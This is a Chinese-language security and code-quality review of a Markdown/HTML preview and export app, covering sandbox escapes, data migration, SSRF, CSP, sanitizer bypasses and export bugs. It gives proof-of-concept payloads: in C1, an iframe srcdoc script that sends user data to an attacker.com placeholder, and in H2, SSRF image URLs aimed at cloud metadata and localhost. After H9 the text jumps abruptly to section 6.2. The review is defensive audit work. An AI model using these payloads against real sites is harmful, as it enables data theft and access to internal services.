## 二、Critical 问题（必须先修）

### C1. 内嵌 `<iframe srcdoc>` 可借助 `allow-same-origin` 突破沙箱

- **位置**：`src/lib/htmlSanitizer.ts`（iframe 处理逻辑）；`src/components/preview/HtmlSandbox.tsx`
- **风险**：
  1. 净化器未对 `srcdoc` 属性做递归净化，直接保留原始字符串
  2. 当用户 HTML 中 iframe 带有 `sandbox="allow-same-origin allow-scripts"` 时，净化器原样保留该 sandbox 属性
  3. 外层 `HtmlSandbox` 默认开启 `allow-same-origin`，使整个预览 iframe 与父页面同源，内层 iframe 脚本可访问父页面 DOM、Cookie、`localStorage`、发起同源请求
- **复现**：
  ```html
  <iframe
    srcdoc="<script>fetch('/api/user').then(r=>r.text()).then(t=>fetch('https://attacker.com/?leak='+encodeURIComponent(t)))</script>"
    sandbox="allow-same-origin allow-scripts"
  ></iframe>
  ```
- **修复建议**：
  1. 强制移除净化后 iframe 的 `allow-same-origin`，无论用户是否指定
  2. 对 `srcdoc` 内容进行递归净化（移除内嵌 `<script>`、事件处理器），而非直接丢弃
  3. 外层 `HtmlSandbox` 在默认情况下不应同时开启 `allow-same-origin` 与 `allow-scripts`
- **产品/UX**：⚠️ 中风险。修复需与"互动脚本控制"开关联动：开关关闭时 sandbox 不含 `allow-scripts`；开关开启时由用户显式授权。对被净化的内容提供视觉提示（如黄色横幅），保留"严格模式/宽松模式"切换

### C2. 旧版 `m2v-store` 数据未迁移，升级将导致用户内容与设置丢失

- **位置**：`src/lib/appStore.ts`、`src/lib/contentStore.ts`
- **风险**：原 `store.ts` 使用单一 `m2v-store` key 持久化所有内容与设置。本分支拆分为 `m2v-app-store` + `m2v-content-store`，但没有代码读取旧的 `m2v-store` 并拆分字段。老用户升级后原有内容会被重置为 fallback / 示例
- **修复建议**：在 `onRehydrateStorage` 或独立迁移脚本中检测 `localStorage.getItem('m2v-store')`，按字段拆分到新 Store，完成后删除旧 key
- **产品/UX**：✅ 无风险。正向防止用户数据丢失

### C3. `appStore` 的 legacy 迁移在每次 rehydrate 时重复执行

- **位置**：`src/lib/appStore.ts`
- **风险**：`onRehydrateStorage` 每次都调用 `getInitialAppStateFromLegacyKeys()`，并用 legacy 值覆盖已恢复的状态。旧版 localStorage key 从未被清除，因此只要这些 key 存在，用户后续对 mode、documentSettings、字体等的修改会在下次刷新时被 legacy 值覆盖
- **修复建议**：参照 `contentStore` 做法，添加 `if (localStorage.getItem('m2v-app-store')) return` 守卫；或在首次迁移后清除 legacy key
- **产品/UX**：✅ 无风险。正向防止设置漂移

### C4. 全量测试套件 `pnpm test` 在 mermaid 用例上超时失败

- **位置**：`src/engine/utils/mermaidRenderer.test.ts`、`vitest.config.ts`
- **事实**：
  ```text
  ❯ src/engine/utils/mermaidRenderer.test.ts (5 tests | 5 failed) 143640ms
    × renderMermaidDiagram > 合法 flowchart 渲染出含 svg 的字符串 47240ms
    × 合法 sequenceDiagram 渲染出含 svg 的字符串 27787ms
    × 非法语法返回 error 且 svg 为空 19274ms
    × offscreen 容器渲染后被移除（DOM 干净） 12028ms
    × ensureMermaid 幂等（多次调用返回同一 Promise） 37309ms
  ```
- **根因**：Mermaid 库依赖完整的 SVG 布局与 `getComputedTextLength`、`getBBox`、`getCTM` 等测量 API。jsdom 仅 mock 了最小桩，mermaid 内部在 jsdom 下进入"挂起等测量回调"的死循环
- **风险**：直接违反 `AGENTS.md §3.1` 与 `docs/代码与提交规范.md` 的"提交前必须 `pnpm test` 通过"验收要求；CI 会被该失败卡住
- **修复方案（按推荐度排序）**：
  1. **推荐**：用 `vi.mock('mermaid', ...)` 替换为纯字符串返回的桩，单测只验证"调用链路 + 错误降级 + 副作用"
  2. 备选：移到 e2e/Playwright 套件
  3. 备选：改用 `happy-dom` 环境（风险更高，需回归验证 IndexedDB、URL.createObjectURL 等）
- **附加配置**：在 `vitest.config.ts` 中配置 `testTimeout`、`pool: 'forks'` 与全局 teardown，隔离 jsdom 状态
- **产品/UX**：✅ 无影响。仅测试层面

### C5. `src/lib/exportDocx.ts` 大面积使用 `any` 抹除类型约束

- **位置**：`src/lib/exportDocx.ts`（第 115、132、215、463、468、476、494、546、561、569、697、780、832、943、950、979、998 行等）
- **风险**：`runs: any[]`、`children: any[]`、`indent: any`、大量 `as any` 抹掉了 docx 库的类型约束。后续升级 docx、重构 Paragraph/Table 配置时，TypeScript 无法捕获字段名、类型变更，极易在运行期报错
- **修复建议**：
  - 使用 `import('docx')` 后的具体类型，如 `Awaited<ReturnType<typeof import('docx')>>['Paragraph']` 或提取 `DocxTypes` 接口
  - 对 `lineRule: 'auto' as any` 等库类型不兼容处，通过 `satisfies` 或模块声明扩展修正
  - 在 eslint 中对该文件解除 `@typescript-eslint/no-explicit-any` 的豁免，逐行收敛
- **产品/UX**：✅ 无影响。仅类型层面

### C6. `fetchImageBuffer` 允许可执行的 `image/svg+xml`

- **位置**：`src/lib/fetchSafe.ts` 第 90–93 行；`src/lib/htmlSanitizer.ts` 第 22–27、43–52、61 行
- **风险**：
  - `fetchImageBuffer` 仅校验 `content-type.startsWith('image/')`，SVG 同样会被放行
  - `SAFE_DATA_MEDIA_TYPES` 包含 `image/`，因此 `data:image/svg+xml` 被判定为安全
  - SVG 可嵌入 `<script>`、事件处理器、`foreignObject`，在 DOCX/PDF 导出流程中通过 `createImageBitmap` 或 `<img>` 解析时可能造成 XSS 或信息泄露
- **修复建议**：
  1. **区分内联 SVG 与 data URI SVG**：内联 SVG 经过净化后保留；data URI SVG 做二次校验
  2. **SVG 净化而非拒绝**：用 DOMParser 解析 SVG，移除 `<script>`、`on*` 事件属性、`foreignObject`，保留图形元素
  3. 对 `fetchImageBuffer` 的 SVG：仅拒绝包含脚本的情况，而非一刀切
  4. 当 SVG 因安全原因被拒绝时，提供明确的错误提示，而非静默失败
- **产品/UX**：🔴 高风险。SVG 数据可视化、图标、插画是常见内容类型，完全拒绝会严重损伤核心渲染能力，必须采用"净化而非拒绝"策略

### C7. `setupIdb.ts` 用 `as unknown as IDBFactory` 伪造不完整的 IndexedDB

- **位置**：`src/test/setupIdb.ts` 第 3–129 行
- **风险**：Mock 仅实现了 `open`/`deleteDatabase` 及部分请求/对象仓库方法，缺少 `cmp`、`databases` 等 IDBFactory 成员；大量属性用 `unknown` + 强制类型转换。测试通过不等于真实浏览器行为正确，且类型转换掩盖了接口缺失
- **修复建议**：
  - 使用 `fake-indexeddb` 等成熟库，或让 Mock 类实现 `IDBFactory`/`IDBDatabase` 的完整接口
  - 移除全局 `indexedDB` 赋值的条件分支，统一在 setup 中注入并在 teardown 中还原
- **产品/UX**：✅ 无影响。仅测试层面

## 三、High 问题（建议合入 master 前修复）

### H1. `useExportAction` 的 `runExport` 闭包依赖 `exporting` 状态，存在并发与 stale state 风险

- **位置**：`src/lib/useExportAction.ts:32-66`
- **风险**：`runExport` 依赖 `exporting`，但用户在导出过程中连续点击导出按钮时，第二次的 `runExport` 闭包可能仍拿到 `exporting=false` 的旧值，导致 `abortRef.current?.abort()` 取消了第一次导出后立即又新建 controller 启动第二次，且 `if (exporting) return` 未生效
- **修复建议**：
  ```ts
  // 改用 ref 跟踪"是否有正在运行的导出"，避免 stale closure
  const runningRef = useRef(false)
  const runExport = useCallback(async (action) => {
    if (runningRef.current) return
    runningRef.current = true
    // ...finally 中置 runningRef.current = false
  }, [onToast])  // 移除 exporting 依赖
  ```
- **产品/UX**：✅ 无风险。正向修复并发 bug

### H2. `fetchSafe` 未限制内网/私有地址，存在浏览器端 SSRF 风险

- **位置**：`src/lib/fetchSafe.ts`
- **风险**：`assertSafeHttpUrl` 仅校验协议为 `http:`/`https:`，未拦截 `127.0.0.1`、`localhost`、`169.254.169.254`、RFC1918 私有地址等。攻击者可构造 Markdown/HTML 图片，使浏览器向内部服务发起请求
- **复现**：
  ```markdown
  ![](http://169.254.169.254/latest/meta-data/)
  ![](http://127.0.0.1:3000/admin/users)
  ```
- **修复建议**：解析 URL 后校验 hostname/IP，拒绝回环、链路本地、RFC1918 私有网段及云厂商元数据服务地址
- **产品/UX**：⚠️ 中风险。企业内网部署场景下，合法内网图片会无法加载。需提供配置开关"允许加载内网资源"（默认关闭），并明确提示风险。错误提示需区分原因（内网被拒 / 重定向到不安全地址 / 网络错误）

### H3. `fetchSafe` 跟随重定向且不校验最终 URL

- **位置**：`src/lib/fetchSafe.ts`
- **风险**：`fetch` 默认跟随 302/301。攻击者可使初始 URL 通过协议校验，再让服务器重定向到 `http://localhost` 或私有服务，绕过 H2 的静态黑名单
- **修复建议**：
  - 采用"校验最终 URL"而非"禁止重定向"：设置 `redirect: 'follow'`，获取响应后读取 `resp.url` 并再次执行 `assertSafeHttpUrl`
  - 限制重定向次数（如最多 5 次），防止无限重定向攻击
- **产品/UX**：⚠️ 中风险。与 H2 联动，需同步提供配置开关，避免阻断合法 CDN 重定向

### H4. 预览 HTML 未注入 CSP，仅依赖净化器做纵深防御

- **位置**：`src/lib/extractHtml.ts`（`previewHtml`）
- **风险**：`previewHtml` 只做 HTML 净化、Tailwind 注入与打印样式注入，没有添加 CSP。一旦净化器被绕过（如 C1 的 srcdoc/sandbox 组合），攻击面会立刻扩大
- **修复建议**：**CSP 策略分层**，而非一刀切：
  - **关闭脚本时**：`default-src *; script-src 'none'; object-src 'none'; frame-src 'none';`（允许图片、字体、样式从任意 HTTPS 加载，仅禁脚本）
  - **开启脚本时**：`default-src *; script-src 'unsafe-inline' 'unsafe-eval'; connect-src *;`（用户显式授权后放宽）
  - 维护可信域名白名单（`fonts.googleapis.com`、`cdn.jsdelivr.net`、`unpkg.com`），白名单内始终放行
- **产品/UX**：🔴 高风险。严格的 `default-src 'none'` 会让大部分合法 HTML 无样式、无图片。必须采用分层策略，默认放行外部资源仅禁脚本，并提供"严格安全模式"开关供高级用户开启

### H5. `<object>` / `<embed>` 在非严格模式下被允许且 `sandbox` 属性对它们无效

- **位置**：`src/lib/htmlSanitizer.ts`
- **风险**：`sandbox` 属性只对 `<iframe>` 生效。净化器把 `<object>`、`<embed>` 与 iframe 同样处理，复制 `src`/`data` 等属性并设置 `sandbox="allow-scripts"`，但这对 object/embed 不起任何限制作用，仍可加载插件或创建嵌套浏览上下文执行外部内容
- **修复建议**：
  - 转换为受控 iframe 而非直接丢弃：`<object data="url">` 转换为 `<iframe src="url" sandbox="allow-scripts">`
  - 对无法转换的内容提供占位提示
  - 保留 PDF 嵌入能力（`application/pdf` 类型白名单放行）
- **产品/UX**：⚠️ 中风险。用户嵌入的 PDF、视频等合法内容需保留，通过转换为受控 iframe 平衡安全与功能

### H6. `htmlSanitizer` 的 URL 净化不彻底 —— 存在可绕过的攻击向量

- **位置**：`src/lib/htmlSanitizer.ts:33-41`、`54-69`
- **风险**：
  1. **HTML 实体编码**：`href="javascript&#58;alert(1)"`——DOMParser 解析后的 `getAttribute()` 返回已解码值，实际可正确识别，但**需增加回归测试**确保后续 refactor 不破坏此行为
  2. **协议空格绕过**：`\u0000javascript:`、`\u001Fjavascript:` 等 C0 控制字符前缀在某些浏览器中可能被忽略——当前 `trim()` 只处理 ASCII whitespace
  3. **`vbscript:` / `view-source:` / `filesystem:`** 等伪协议未被显式拒绝
  4. **`data:` URL 的二级判断**：流程正确但建议加测试固化
- **修复建议**：
  - `isDangerousUrl` 改为 `isSafeUrl` 内的**白名单**判断，仅允许 `http:/https:/mailto:/tel:` + 相对路径/锚点 + 安全 data: 类型
  - 在 `isSafeUrl` 顶部 `trim()` 前先过滤所有 `[\s\u0000-\u001F]` 控制字符
  - 补充 `htmlSanitizer.test.ts` 中的实体编码、控制字符、`vbscript:` 等用例
- **产品/UX**：✅ 无风险。正向安全增强，不阻断合法 URL

### H7. iframe/object/embed 的 sandbox 默认值过于宽松

- **位置**：`src/lib/htmlSanitizer.ts:142-144`
- **风险**：默认给没有 sandbox 的 iframe 注入 `sandbox="allow-scripts"`，允许脚本执行——对纯装饰性第三方 iframe 而言是不必要的权限。保留用户指定的 sandbox 时未做裁剪——例如用户写了 `sandbox="allow-same-origin allow-scripts allow-popups allow-forms"`，当前完整保留，等价于几乎无限制
- **修复建议**：默认 sandbox 设为空字符串（完全禁止脚本与弹窗）；对用户自定义 sandbox 属性做交集裁剪，仅保留白名单关键字；与"互动脚本控制"开关联动，由用户显式授权
- **产品/UX**：⚠️ 中风险。与 C1、M1 联动，需保留用户对交互内容（CodePen 嵌入、教学示例）的控制权

### H8. 构建产物体积严重失控，多个 chunk 超过 700KB 警告阈值

- **位置**：`vite.config.ts` 第 61 行
- **事实**：

  | chunk | 体积 | gzip |
  | --- | ---: | ---: |
  | `tex-svg` (MathJax) | 1821.75 kB | 619.21 kB |
  | `aliyun-oss-sdk` | 690.30 kB | 188.54 kB |
  | `mermaid-vendor` | 663.75 kB | 163.76 kB |
  | `codemirror-vendor` | 635.38 kB | 218.22 kB |
  | `wardley` | 615.11 kB | 148.53 kB |
  | `cytoscape.esm` | 443.39 kB | 142.23 kB |

- **根因**：
  1. `aliyun-oss-sdk` 与 `cos-js-sdk-v5` 被显式提到 `manualChunks`，反而阻止了 code-splitting 收益
  2. MathJax `tex-svg` 单个 chunk 1.8MB，首屏直接以 `<script>` 同步注入
- **修复建议**：
  - 从 `vite.config.ts` 的 `manualChunks` 中移除 OSS/COS，让 Rollup 按 dynamic import 自动分块
  - 拆分 `mathjax-vendor`，或把 MathJax 改为按需动态 import（公式导出/预览时才加载）
  - 评估 PWA precache 范围，将字体/非关键 chunk 移出 precache，改为运行时缓存
  - 可考虑改用 `tex-mml-chtml`（HTML+CSS 渲染）体积小一个量级（~200kB）
- **产品/UX**：⚠️ 中风险。按需加载时需显示"公式渲染中…"loading 占位符，避免 LaTeX 源码闪烁；用户首次输入 `$` 时预加载，确保 PWA 预缓存以支持离线

### H9. `protectCode` 块级代码正则不会匹配"同一行 ```info ``` 单行围栏"

- **位置**：`src/engine/utils/codeProtect.ts:41-50`
- **风险**：正则要求 `\n` 包裹代码块，单行代码围栏（如 ` ```code``` `，markdown 允许的语法）无法被保护；后续行内代码正则又会把它当作行内代码处理（去掉中间的反引号），造成保护失效

- **问题**：`URL.createObjectURL(blob)` 在 line 409 创建，但 `URL.revokeObjectURL(url)` 仅在图片加载成功时执行。若 `new Image()` 失败（onerror），Promise reject 后 ObjectURL 泄漏
- **修复**：将 `revokeObjectURL` 移入 `finally` 块

### 6.2 LRU 缓存重插入正确性问题

- **位置**：`src/lib/editor/imageStorage.ts:201-219`
- **问题**：`rememberImageUrl` 每次调用都 delete+set，导致 Map 无限增长，`localImageUrls` 可超过 64 个条目
- **修复**：改为原地更新 Map 条目，而非 delete+set

### 6.3 `contentStore.ts` 遗留迁移可能覆盖已持久化数据

- **位置**：`src/lib/contentStore.ts:131-153`
- **问题**：`onRehydrateStorage` 无条件应用遗留 localStorage 键，即使 IndexedDB 已有有效数据也会被覆盖
- **修复**：仅在重水合状态包含默认值时才应用遗留键

### 6.4 DOCX 导出中 mermaidReady 超时后仍尝试渲染

- **位置**：`src/lib/exportDocx.ts:1071-1080`
- **问题**：初始加载超时后，`convertMermaid` 仍会再次调用 `ensureMermaid()`，可能再次挂起 5 秒
- **修复**：超时后跳过后续 mermaid 渲染尝试

### 6.5 `App.tsx` 的 `syncDemoContent` 在 StrictMode 下双触发

- **位置**：`src/App.tsx:114-117`
- **问题**：React 18 StrictMode 下 `useEffect` 故意双触发；虽然 `syncDemoContent` 内部有 `demoVersion === DEMO_VERSION` 短路保护，但在"用户已经编辑过内容"与 `demoVersion` 已升级的边界 case 下，理论上仍存在幂等性被破坏的风险。升级到新版 demo 时所有用户的旧 localStorage 都会被覆盖
- **修复建议**：把版本号改为"构建时注入的 hash + 版本号"，并在每次 `pnpm build` 时自动 bump；改用 `requestIdleCallback` 包装

### 6.6 `blockRenderRegistry.ts` 的 `paragraphRenderer.match: () => true` 是兜底 renderer

- **位置**：`src/engine/utils/blockRenderRegistry.ts:663-705`
- **问题**：当某条 markdown 同时满足多个 renderer 的 `match`，仅靠注册顺序决定命中者。当前依赖 renderers 数组的精确顺序，新增 renderer 时极易引入静默 bug
- **修复建议**：为每个 renderer 加显式 `priority` 字段（数字越小越优先），dispatch 时按 priority 排序

### 6.7 ZIP 重名检测：未验证生成名是否与其他批次文件冲突

- **位置**：`src/lib/export/zipDownload.ts:16-33`
- **问题**：`filenameMap` 以 `original`（原始文件名）而非"最终生成名"作为 key——若用户同时传入 `a.png` 和 `a-1.png`，再传入第三个 `a.png` 时，生成的 `a-1.png` 会与已存在条目冲突。另外，`.tar.gz` 等复合扩展会被拆为 `tar-1.gz`，丢失原语义
- **修复建议**：改为循环校验生成名是否已被占用（维护一个 `usedNames` set），或统一采用 `name (count).ext` 风格

### 6.8 `imageStorage.ts` 的 `localImageUrls` 是模块级可变 Record

- **位置**：`src/lib/editor/imageStorage.ts:184`
- **问题**：`localImageUrls` 与 `localImageUrlOrder` 是模块级全局可变状态，在 SSR 或多实例（多 tab + SharedWorker）下会出现"两个 store 共享同一份 cache"但 ObjectURL 又无法跨 Realm 的撕裂。测试场景下（多组测试并发运行）会出现 cache 污染
- **修复建议**：把 `localImageUrls` 移入一个 React Context Provider 的 ref 中；或在 `localImageUrls` 上加 `WeakRef<Document>` 维度

### 6.9 `useExportAction` 不报告导出进度

- **位置**：`src/lib/useExportAction.ts:15-68`
- **问题**：`runExport` 只接受 `(ctx) => Promise<string | void>`，但 `exportIframeToPdf` 等实际支持 `onProgress(current, total)` 回调。`useExportAction` 未把进度透出，导致 UI 上的"打包中…"文案无进度反馈
- **修复建议**：扩展 `runExport` 接受 `onProgress` 回调，并在 `useExportAction` 返回 `[exporting, progress, runExport, cancel]`
- **产品/UX**：✅ 正向。UX 提升

### 6.10 `fetchImageBuffer` 的 `cache: 'force-cache'` 可被滥用

- **位置**：`src/lib/exportImage.ts:170` 与 `src/lib/editor/imageStorage.ts:388-424`
- **问题**：`domToBlob` / `domToJpeg` 传入 `fetch: { requestInit: { cache: 'force-cache' } }` 会让浏览器把图片缓存在 HTTP 缓存中（即便用户没主动访问）。当用户把任意外链图片粘贴进文档，本地图片的缓存条目会污染用户浏览历史与磁盘占用
- **修复建议**：保留 `force-cache` 但限制缓存条目数量（如最多 100 张）；或改为 `default` 但提供加载进度；对同一图片 URL 在单次导出内去重，避免重复请求
- **产品/UX**：⚠️ 中风险。修改缓存策略可能影响图片加载速度，需平衡导出速度与缓存污染

### 6.11 `fetchWithTimeout` 忽略调用方传入的 `signal`

- **位置**：`src/lib/fetchSafe.ts`
- **问题**：函数内部新建 `AbortController` 覆盖调用方可能传入的 `signal`。调用方无法通过自身 signal 取消请求，只能等超时
- **修复建议**：合并外部 `signal` 与内部超时 signal（可用 `AbortSignal.any` 或手动监听 `abort` 事件）

### 6.12 `useExportAction` 错误信息直接拼接到 Toast

- **位置**：`src/lib/useExportAction.ts`
- **问题**：`onToast(`导出失败：${e instanceof Error ? e.message : '未知错误'}`)` 若 Toast 组件使用 `innerHTML` 渲染，异常消息中的 HTML/脚本可能导致 XSS
- **修复建议**：Toast 侧必须按纯文本转义；`useExportAction` 也可对消息做字符过滤

### 6.13 `htmlSanitizer` 保留 `autofocus`、`autoplay` 等属性

- **位置**：`src/lib/htmlSanitizer.ts`
- **问题**：可导致焦点劫持、自动播放音频/视频等骚扰行为
- **修复建议**：移除 `autofocus`（焦点劫持无合法用途）；保留 `autoplay` 但默认静音（`autoplay` + `muted` 是浏览器允许的自动播放方式）；或提供"允许自动播放"开关，默认关闭
- **产品/UX**：⚠️ 中风险。教学视频、演示内容依赖自动播放，需保留功能但默认静音或提供开关

### 6.14 `captureElementInIframeToBlob` 未限制截图尺寸上限

- **位置**：`src/lib/exportImage.ts`
- **问题**：用户构造极高/极宽的 DOM，截图时可能耗尽内存或导致浏览器无响应/崩溃
- **修复建议**：对计算出的 `w/h` 设置合理上限（如 16000×16000），超限时报错或按比例缩放
- **产品/UX**：✅ 正向。防止浏览器崩溃，保护用户体验

### 6.15 导出链路的"样式恢复"`finally` 在 throw 后仍可能跳过

- **位置**：`src/lib/exportPdf.ts:100-105`、`src/lib/exportImage.ts:340-365`
- **问题**：当 `exportIframeToPdf` 自身在循环外报错时，`pdf.save(filename)` 不会执行，但进度条/loading 状态可能已经显示了 100%，对用户造成误导
- **修复建议**：在 `exportPdf.ts` 的循环中用 `onProgress` 报告"失败"状态而非"继续"；`captureElementInIframeToBlob` 在抛错时应该返回 `{ blob: null, error }` 而非抛，让调用方有完整控制权
- **产品/UX**：✅ 正向。UX 提升
